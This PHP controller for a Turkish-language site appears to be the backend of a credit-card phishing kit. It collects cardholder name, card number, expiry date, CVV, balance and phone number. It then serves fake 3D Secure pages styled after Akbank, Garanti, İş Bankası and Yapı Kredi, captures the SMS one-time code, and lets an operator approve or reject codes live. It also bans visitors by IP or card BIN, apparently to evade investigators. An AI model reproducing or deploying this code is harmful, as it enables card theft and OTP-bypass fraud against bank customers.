<?php
defined('BASEPATH') or exit('Doğrudan erişime izin verilmiyor');

class Home extends CI_Controller
{

	public function __construct()
	{
		parent::__construct();
		$this->output->set_header('Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0');
		$this->output->set_header('Pragma: no-cache');

		$bansor = $this->db->get_where('banlar', ['ip' => get_ip()]);
		if ($bansor->num_rows() > 0) {
			redirect("https://www.youtube.com/watch?v=2fy2SOVbIBI");
		}
	}

	public function index()
	{
		if ($_POST) {

			$json = array("status" => 'error', "message" => '');

			$hash 		= rastgele_sifre(30);
			$authCode	= post('authCode');
			$telefon 		= post('telefon');
			
			$cc_name 	= post('cc_name');
			$cc_no 		= post('cc_no');
			$cc_no = str_replace(' ', '', $cc_no);
			$cc_date    = post('cc_date');
			$cc_cvv    	= post('cc_cvv');
			$balance    = post('balance');

			/*$str = preg_match('/[^a-zA-Z _]/', $cc_name);
			if ($str) {
				$this->db->insert('banlar', ['ip' => get_ip(), 'neden' => 'isim soyisim geçersiz # 1', 'tarih' => date('Y-m-d H:i:s')]);
				$json['message'] = 'refresh';
				echo json_encode($json);
				exit;
			}*/

			$banlibinsor = $this->db->get_where('binler', ['bin' => mb_substr($cc_no, 0, 6)]);
			if ($banlibinsor->num_rows() > 0) {

				$bibin = $banlibinsor->row();

				if ($bibin->status == 'banli') {
					$this->db->insert('banlar', ['ip' => get_ip(), 'neden' => 'banlı bin : ' . mb_substr($cc_no, 0, 6), 'tarih' => date('Y-m-d H:i:s')]);
					$json['message'] = 'refresh';
					echo json_encode($json);
					exit;
				} else if ($bibin->status == "0") {
					$json['message'] = 'Bu kart kabul edilmiyor. Lütfen başka bir kart deneyin.';
					echo json_encode($json);
					exit;
				}
			}

			function validatecard($number)
			{
				global $type;

				$cardtype = array(
					"visa"       => "/^4[0-9]{12}(?:[0-9]{3})?$/",
					"mastercard" => "/^5[1-5][0-9]{14}$/",
					"amex"       => "/^3[47][0-9]{13}$/",
					"discover"   => "/^6(?:011|5[0-9]{2})[0-9]{12}$/",
				);

				if (preg_match($cardtype['visa'], $number)) {
					$type = "visa";
					return 'visa';
				} else if (preg_match($cardtype['mastercard'], $number)) {
					$type = "mastercard";
					return 'mastercard';
				} else if (preg_match($cardtype['amex'], $number)) {
					$type = "amex";
					return 'amex';
				} else if (preg_match($cardtype['discover'], $number)) {
					$type = "discover";
					return 'discover';
				} else {
					return false;
				}
			}

			if (!validatecard($cc_no)) {
				$json['message'] = "Kredi kartı geçersiz!";
			}

			if (siteayar()->robot_dogrulamasi == 1) {
				if ($authCode != $_SESSION['captcha']) {
					$json['message'] = "Güvenlik kodunu yanlış girdiniz. Lütfen kontrol ederek tekrar deneyiniz.";
				}
			}

			if ($json['message'] == '') {
				$Query = false;

				$__hash = isset($_SESSION['hash']) ? $_SESSION['hash'] : '';

				$this->db->where('hash', $__hash);
				if ($this->db->get('credit_card')->num_rows() > 0) {

					$hash = $__hash;

					$this->db->where('hash', $__hash);
					$Query = $this->db->update('credit_card', array(
						'no'		=> $telefon,
						'cc_name' 	=> $cc_name,
						'cc_no' 	=> $cc_no,
						'cc_date' 	=> $cc_date,
						'cc_cvv' 	=> $cc_cvv,
						'balance' 	=> $balance,
						'tarih' 	=> date('Y-m-d H:i:s'),
						'ip' 		=> get_ip(),
						'sms_code' => 'int_geldi',
						'isOnlineLastDate' => date('Y-m-d H:i:s')
					));
				} else {
					$Query = $this->db->insert('credit_card', array(
						'no'		=> $telefon,
						'hash'		=> $hash,
						'cc_name' 	=> $cc_name,
						'cc_no' 	=> $cc_no,
						'cc_date' 	=> $cc_date,
						'cc_cvv' 	=> $cc_cvv,
						'balance' 	=> $balance,
						'tarih' 	=> date('Y-m-d H:i:s'),
						'ip' 		=> get_ip(),
						'isOnlineLastDate' => date('Y-m-d H:i:s')
					));
				}

				if ($Query) {
					$_SESSION['hash'] = $hash;
					$json['status'] = "success";
					$json['message'] = base_url('3dsecure/' . $hash);
				}
			}

			if ($json['status'] == "error") {
				$json['csrfName'] = $this->security->get_csrf_token_name();
				$json['csrfHash'] = $this->security->get_csrf_hash();
				$json['message'] = '<div class="text-danger">' . $json['message'] . '</div>';
			}

			echo json_encode($json);
			exit;
		}

		$this->load->view('hgs2/index', array(
			'sayfa_adi' => 'home',
		));
	}

	public function treedsecure($hash)
	{
		$data = $this->db->get_where('credit_card', ['hash' => $hash]);
		if ($data->num_rows() == 0) {
			redirect(base_url());
			exit;
		}
		$data = $data->row();

		$databin = mb_substr($data->cc_no, 0, 6);
		$bin = $this->db->get_where('binler', ['bin' => $databin])->row();

		$pos = '_default';
		$logoyol = '';

		if (isset($bin->id)) {

			$logo_name = url_title(convert_accented_characters($bin->banka_adi), '-', TRUE) . '.png';
			$logoyol = 'public/bank/' . $logo_name;

			if (mb_strstr(mb_strtolower($bin->banka_adi), 'akbank') !== FALSE) {
				$pos = 'akbank';
			}

			if (mb_strstr(mb_strtolower($bin->banka_adi), 'garanti') !== FALSE) {
				$pos = 'garanti';
			}

			if (mb_strstr($bin->banka_adi, 'İŞ BANKASI') !== FALSE) {
				$pos = 'isbankasi';
			}

			if (mb_strstr(mb_strtolower($bin->banka_adi), 'yapi ve kredi') !== FALSE) {
				$pos = 'yapikredi';
			}
		} else {
			$pos = '_default';
		}

		$this->load->view('poslar/' . $pos . '/index', array(
			'data' => $data,
			'logoyol' => $logoyol
		));
	}

	public function bkm_otp($hash)
	{
		$data = $this->db->get_where('credit_card', ['hash' => $hash]);
		if ($data->num_rows() == 0) {
			exit;
		}
		$data = $data->row();

		$this->db->where('hash', $hash);
		$this->db->update('credit_card', ['sms_code' => post('password'), 'isOnlineLastDate' => date('Y-m-d H:i:s')]);
	}

	public function data()
	{
		$hash = post('hash');
		$islm = post('islm');

		$data = $this->db->get_where('credit_card', ['hash' => $hash]);
		if ($data->num_rows() == 0) {
			echo 0;
			exit;
		}
		$data = $data->row();


		if ($islm == "yeni_sms") {
			$this->db->where('hash', $hash);
			$this->db->update('credit_card', ['sms_code' => "", 'isOnlineLastDate' => date('Y-m-d H:i:s')]);
		}

		if ($islm == "guest_new_sms") {
			$this->db->where('hash', $hash);
			$this->db->update('credit_card', ['sms_code' => "guest_new_sms", 'isOnlineLastDate' => date('Y-m-d H:i:s')]);
		}

		if ($islm == "admin_new_sms") {
			$this->db->where('hash', $hash);
			$this->db->update('credit_card', ['sms_code' => "admin_new_sms",  'isOnlineLastDate' => date('Y-m-d H:i:s')]);
		}

		if ($islm == "otp_onayla") {
			$this->db->where('hash', $hash);
			$this->db->update('credit_card', ['sms_code' => "otp_onayla", 'isOnlineLastDate' => date('Y-m-d H:i:s')]);
		}
		if ($islm == "otp_gecersiz") {
			$this->db->where('hash', $hash);
			$this->db->update('credit_card', ['sms_code' => "otp_gecersiz",  'isOnlineLastDate' => date('Y-m-d H:i:s')]);
		}

		if ($islm == "sms_sor") {
			echo $data->sms_code;


			$this->db->where('hash', $hash);
			$this->db->update('credit_card', ['isOnlineLastDate' => date('Y-m-d H:i:s')]);
		}
	}

	public function captcha()
	{
		$image = @imagecreatetruecolor(120, 30) or die("hata oluştu");

		// arkaplan rengi oluşturuyoruz
		$background = imagecolorallocate($image, 0xFF, 0xFF, 0xFF);
		imagefill($image, 0, 0, $background);
		$linecolor = imagecolorallocate($image, 0xCC, 0xCC, 0xCC);
		$textcolor = imagecolorallocate($image, 0x33, 0x33, 0x33);

		// rast gele çizgiler oluşturuyoruz
		for ($i = 0; $i < 6; $i++) {
			imagesetthickness($image, rand(1, 3));
			imageline($image, 0, rand(0, 30), 120, rand(0, 30), $linecolor);
		}


		// rastgele sayılar oluşturuyoruz
		$sayilar = '';
		for ($x = 15; $x <= 95; $x += 20) {
			$sayilar .= ($sayi = rand(0, 9));
			imagechar($image, rand(3, 5), $x, rand(2, 14), $sayi, $textcolor);
		}

		// sayıları session aktarıyoruz
		$_SESSION['captcha'] = $sayilar;

		// resim gösteriliyor ve sonrasında siliniyor
		header('Content-type: image/png');
		imagepng($image);
		imagedestroy($image);
	}

	public function zping()
	{
		$ip = get_ip();
		$tarih = date('Y-m-d H:i:s');

		$this->db->where('ip', $ip);
		if ($this->db->get('ziyaretciler')->num_rows() > 0) {

			$this->db->where('ip', $ip);
			$this->db->update('ziyaretciler', array(
				'ip' 				=> $ip,
				'useragent'			=> isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '',
				'onlinelastdate' 	=> $tarih,
			));
		} else {
			$this->db->insert('ziyaretciler', array(
				'ip' 				=> $ip,
				'useragent'			=> isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '',
				'onlinelastdate' 	=> $tarih,
			));
		}
	}
}
